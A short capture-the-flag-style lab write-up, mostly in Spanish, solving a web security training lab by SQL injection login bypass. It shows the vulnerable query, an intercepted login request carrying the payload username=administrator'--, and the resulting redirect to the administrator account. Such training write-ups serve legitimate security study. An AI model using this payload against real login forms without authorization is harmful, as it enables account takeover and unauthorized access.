---
title: "Lab: SQL injection vulnerability allowing login bypass"
date: 2025-11-03
category: "SQL Injection"
order: 3
tags: ["web-security-academy", "sql-injection", "lab"]
layout: layouts/writeup.njk
permalink: /writeups/sql-injection-lab-login-bypass.html
---

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

---

## Paso 1 — Probar con una comilla simple

Se prueba una comilla simple en el campo de usuario para confirmar la vulnerabilidad.

## Paso 2 — Payload con el usuario administrator

La lógica de la consulta de login es equivalente a:

```sql
SELECT firstname FROM users WHERE username='administrator'--' and password="123"
```

Al interceptar el login con Burp Suite y modificar el campo `username`:

```
POST /login HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=...&username=administrator'--&password=bluecheese
```

El `--` comenta el chequeo de la contraseña, así que la consulta queda equivalente a `WHERE username='administrator'`, sin importar qué contraseña se envíe.

## Respuesta

```
HTTP/2 302 Found
Location: /my-account?id=administrator
Set-Cookie: session=...; Secure; HttpOnly; SameSite=None
```

El servidor logueó exitosamente como `administrator` sin conocer la contraseña real. Lab resuelto.
